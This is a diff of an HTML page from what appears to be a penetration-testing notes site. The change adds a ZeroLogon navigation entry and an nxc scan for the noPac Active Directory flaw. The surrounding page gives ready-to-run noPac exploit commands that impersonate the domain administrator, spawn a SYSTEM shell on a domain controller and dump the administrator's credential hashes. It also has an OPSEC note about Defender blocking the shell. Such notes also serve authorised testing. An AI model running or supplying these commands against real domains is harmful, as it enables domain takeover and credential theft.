@@ -2813,6 +2813,29 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Initial%20Access%20%26%20Delivery/ZeroLogon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ZeroLogon
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -3697,13 +3720,16 @@
 <p><a href="https://github.com/Ridter/noPac.git">https://github.com/Ridter/noPac.git</a></p>
 <h2 id="identify">Identify</h2>
 <hr />
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">scanner</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;password&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">DCIP</span><span class="p">&gt;</span> <span class="n">-use-ldap</span>
+<p><div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">scanner</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;password&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">DCIP</span><span class="p">&gt;</span> <span class="n">-use-ldap</span>
 </span></code></pre></div>
+nxc:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-M<span class="w"> </span>nopac
+</span></code></pre></div></p>
 <h2 id="exploit">Exploit</h2>
 <hr />
-<p><div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">noPac</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;pass&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span>  <span class="n">-dc-host</span> <span class="n">DC01</span> <span class="n">-shell</span> <span class="p">-</span><span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">-use-ldap</span>
+<p><div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">noPac</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;pass&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span>  <span class="n">-dc-host</span> <span class="n">DC01</span> <span class="n">-shell</span> <span class="p">-</span><span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">-use-ldap</span>
 </span></code></pre></div>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">noPac</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;pass&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span>  <span class="n">-dc-host</span> <span class="n">DC01</span> <span class="p">-</span><span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">-use-ldap</span> <span class="n">-dump</span> <span class="n">-just-dc-user</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">administrator</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">noPac</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;pass&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span>  <span class="n">-dc-host</span> <span class="n">DC01</span> <span class="p">-</span><span class="n">-impersonate</span> <span class="n">administrator</span> <span class="n">-use-ldap</span> <span class="n">-dump</span> <span class="n">-just-dc-user</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">administrator</span>
 </span></code></pre></div></p>
 <blockquote>
 <p>[!important] OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.</p>
